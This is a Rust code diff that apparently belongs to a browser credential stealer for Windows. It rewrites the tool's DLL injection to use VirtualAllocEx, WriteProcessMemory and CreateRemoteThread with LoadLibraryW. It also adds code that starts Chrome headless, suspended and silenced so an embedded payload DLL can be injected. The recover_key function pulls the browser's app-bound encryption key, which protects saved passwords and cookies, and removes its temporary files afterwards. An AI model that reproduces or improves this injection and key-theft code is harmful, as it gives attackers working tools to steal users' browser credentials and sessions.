@@ -42,16 +42,19 @@ use windows::{
         },
         System::{
             Diagnostics::{
+                Debug::WriteProcessMemory,
                 ToolHelp::{
                     CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                     TH32CS_SNAPPROCESS,
                 },
             },
             LibraryLoader::{GetModuleHandleW, GetProcAddress},
-            Memory::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE},
+            Memory::{VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE},
             Threading::{
-                CreateProcessW, QueryFullProcessImageNameW, TerminateProcess, WaitForSingleObject,
+                CreateProcessW, CreateRemoteThread, GetExitCodeThread, OpenProcess,
+                QueryFullProcessImageNameW, ResumeThread, TerminateProcess, WaitForSingleObject,
                 INFINITE, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_NAME_WIN32, PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE,
+                PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
                 STARTUPINFOW, STARTUPINFOW_FLAGS,
             },
         },
@@ -491,74 +494,173 @@ fn scan_install_paths(target_exe: &str, browser_name: &str) -> Option<String> {
 }
 
 #[cfg(windows)]
-pub fn inject(target_pid: u32, payload_dll: &[u8]) -> Option<()> {
+fn resolve_browser_exe(target_exe: &str, browser_name: &str) -> Option<String> {
+    enum_proc_ids(target_exe)
+        .iter()
+        .find_map(|&pid| proc_image_path(pid))
+        .or_else(|| scan_install_paths(target_exe, browser_name))
+}
+
+#[cfg(windows)]
+fn inject_dll(pid: u32, dll_path: &Path) -> Result<(), ()> {
+    let dll_wide = to_wide(&dll_path.to_string_lossy());
+    let dll_bytes = dll_wide.len() * 2;
+
     unsafe {
-        let mut nt_proc: NtHandle = std::ptr::null_mut();
-        let mut obj_attr: OBJECT_ATTRIBUTES = mem::zeroed();
-        obj_attr.Length = mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
-        let mut client_id = CLIENT_ID {
-            UniqueProcess: target_pid as NtHandle,
-            UniqueThread: std::ptr::null_mut(),
-        };
-        let status = NtOpenProcess(
-            &mut nt_proc,
-            PROCESS_QUERY_INFORMATION.0 | 0x0008 | 0x0020 | 0x0010 | 0x0002,
-            &mut obj_attr,
-            &mut client_id,
-        );
-        if status != STATUS_SUCCESS {
-            return None;
+        let proc = OpenProcess(
+            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
+            false,
+            pid,
+        )
+        .map_err(|_| ())?;
+
+        let remote = VirtualAllocEx(proc, None, dll_bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if remote.is_null() {
+            CloseHandle(proc).ok();
+            return Err(());
         }
 
-        let mut alloc_base: NtHandle = std::ptr::null_mut();
-        let mut region_size: usize = payload_dll.len();
-        let status = NtAllocateVirtualMemory(
-            nt_proc,
-            &mut alloc_base as *mut NtHandle as *mut PVOID,
-            0,
-            &mut region_size,
-            (MEM_COMMIT.0 | MEM_RESERVE.0) as u32,
-            PAGE_READWRITE.0 as u32,
-        );
-        if status != STATUS_SUCCESS {
-            return None;
+        let mut written = 0usize;
+        if WriteProcessMemory(
+            proc,
+            remote,
+            dll_wide.as_ptr() as *const _,
+            dll_bytes,
+            Some(&mut written),
+        )
+        .is_err()
+        {
+            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
+            CloseHandle(proc).ok();
+            return Err(());
         }
 
-        let mut bytes_written: usize = 0;
-        let status = NtWriteVirtualMemory(
-            nt_proc,
-            alloc_base as PVOID,
-            payload_dll.as_ptr() as PVOID,
-            payload_dll.len(),
-            &mut bytes_written,
-        );
-        if status != STATUS_SUCCESS {
-            return None;
-        }
+        let k32 = GetModuleHandleW(windows::core::w!("kernel32.dll")).map_err(|_| ())?;
+        let loadlib = GetProcAddress(k32, PCSTR(b"LoadLibraryW\0".as_ptr())).ok_or(())?;
+        let start_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 = mem::transmute(loadlib);
 
-        let mut thread_handle: NtHandle = std::ptr::null_mut();
-        let status = NtCreateThreadEx(
-            &mut thread_handle,
-            0x1FFFFF,
-            std::ptr::null_mut(),
-            nt_proc,
-            alloc_base as PVOID,
-            std::ptr::null_mut(),
-            0,
-            0,
-            0,
-            0,
-            std::ptr::null_mut(),
-        );
-        if status != STATUS_SUCCESS {
-            return None;
-        }
-        let thread_handle = HANDLE(thread_handle as *mut c_void);
+        let thr = CreateRemoteThread(proc, None, 0, Some(start_fn), Some(remote), 0, None).map_err(|_| {
+            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
+            let _ = CloseHandle(proc);
+        })?;
 
-        CloseHandle(HANDLE(nt_proc as *mut c_void)).ok();
-        CloseHandle(thread_handle).ok();
-        Some(())
+        WaitForSingleObject(thr, INFINITE);
+        let mut exit_code = 0u32;
+        GetExitCodeThread(thr, &mut exit_code).ok();
+        CloseHandle(thr).ok();
+        VirtualFreeEx(proc, remote, 0, MEM_RELEASE).ok();
+        CloseHandle(proc).ok();
+
+        if exit_code == 0 {
+            return Err(());
+        }
     }
+    Ok(())
+}
+
+#[cfg(windows)]
+fn spawn_suspended_and_inject(
+    chrome_exe: &str,
+    dll_path: &Path,
+    profile_dir: &Path,
+) -> Result<u32, ()> {
+    let profile_str = profile_dir.to_string_lossy();
+    let cmdline = format!(
+        "\"{chrome_exe}\" --headless=new --disable-gpu \
+         --disable-logging --log-level=3 --silent-debug-dump \
+         --disable-background-networking --disable-sync --disable-default-apps \
+         --disable-features=PushMessaging,NotificationTriggers \
+         --remote-debugging-port=0 --no-first-run \
+         --no-default-browser-check --noerrdialogs \
+         --user-data-dir=\"{profile_str}\""
+    );
+
+    let exe_w = to_wide(chrome_exe);
+    let mut cmd_w = to_wide(&cmdline);
+
+    let mut si = STARTUPINFOW {
+        cb: mem::size_of::<STARTUPINFOW>() as u32,
+        dwFlags: STARTUPINFOW_FLAGS(0x0000_0100),
+        ..Default::default()
+    };
+    let mut pi = PROCESS_INFORMATION::default();
+    const CREATE_FLAGS: u32 = 0x0000_0004 | 0x0800_0000;
+
+    unsafe {
+        let nul = CreateFileW(
+            windows::core::w!("NUL"),
+            FILE_GENERIC_WRITE.0,
+            FILE_SHARE_WRITE,
+            None,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            HANDLE::default(),
+        )
+        .map_err(|_| ())?;
+
+        si.hStdInput = nul;
+        si.hStdOutput = nul;
+        si.hStdError = nul;
+
+        CreateProcessW(
+            PCWSTR(exe_w.as_ptr()),
+            PWSTR(cmd_w.as_mut_ptr()),
+            None,
+            None,
+            true,
+            PROCESS_CREATION_FLAGS(CREATE_FLAGS),
+            None,
+            None,
+            &si,
+            &mut pi,
+        )
+        .map_err(|_| {
+            let _ = CloseHandle(nul);
+        })?;
+
+        CloseHandle(nul).ok();
+        let pid = pi.dwProcessId;
+
+        match inject_dll(pid, dll_path) {
+            Ok(()) => {
+                ResumeThread(pi.hThread);
+                CloseHandle(pi.hThread).ok();
+                CloseHandle(pi.hProcess).ok();
+                Ok(pid)
+            }
+            Err(()) => {
+                TerminateProcess(pi.hProcess, 1).ok();
+                CloseHandle(pi.hThread).ok();
+                CloseHandle(pi.hProcess).ok();
+                Err(())
+            }
+        }
+    }
+}
+
+#[cfg(not(windows))]
+fn inject_dll(_pid: u32, _dll_path: &Path) -> Result<(), ()> {
+    Err(())
+}
+
+#[cfg(not(windows))]
+fn resolve_browser_exe(_target_exe: &str, _browser_name: &str) -> Option<String> {
+    None
+}
+
+#[cfg(not(windows))]
+fn spawn_suspended_and_inject(
+    _chrome_exe: &str,
+    _dll_path: &Path,
+    _profile_dir: &Path,
+) -> Result<u32, ()> {
+    Err(())
+}
+
+#[cfg(windows)]
+pub fn inject(target_pid: u32, payload_dll: &[u8]) -> Option<()> {
+    let _ = (target_pid, payload_dll);
+    None
 }
 
 #[cfg(not(windows))]
@@ -681,7 +783,7 @@ fn read_key_from_result(path: &Path) -> Option<Vec<u8>> {
     hex_to_key(hex)
 }
 
-/// Extract embedded payload, inject via NTAPI, return 32-byte app-bound key.
+/// Extract embedded payload to temp, inject via LoadLibraryW, return 32-byte app-bound key.
 pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     if payload_dll.is_empty() {
         return None;
@@ -691,10 +793,20 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     }
 
     let target = browsers::find_target(browser_name)?;
+    let browser_exe = resolve_browser_exe(target.exe, browser_name)?;
+
     let tag = ctx_id();
-    let result_path = env::temp_dir().join(format!("{tag}.json"));
+    let temp = env::temp_dir();
+    let dll_path = temp.join(format!("{tag}.tmp"));
+    let result_path = temp.join(format!("{tag}.json"));
+    let profile_dir = temp.join(format!("{tag}_p"));
+
     let mut guard = TempGuard::new();
+    guard.track_file(dll_path.clone());
     guard.track_file(result_path.clone());
+    guard.track_dir(profile_dir.clone());
+
+    fs::write(&dll_path, payload_dll).ok()?;
 
     let result_key = env_key_result();
     let user_data_key = env_key_user_data();
@@ -716,13 +828,21 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     guard.track_env(data_root_key);
     guard.track_env(browser_key);
 
-    let mut injected = false;
-    for pid in enum_proc_ids(target.exe) {
-        if inject(pid, payload_dll).is_some() {
-            injected = true;
-            break;
+    let injected = if let Ok(pid) =
+        spawn_suspended_and_inject(&browser_exe, &dll_path, &profile_dir)
+    {
+        guard.spawned_pid = Some(pid);
+        true
+    } else {
+        let mut ok = false;
+        for pid in enum_proc_ids(target.exe) {
+            if inject_dll(pid, &dll_path).is_ok() {
+                ok = true;
+                break;
+            }
         }
-    }
+        ok
+    };
 
     if !injected {
         return None;
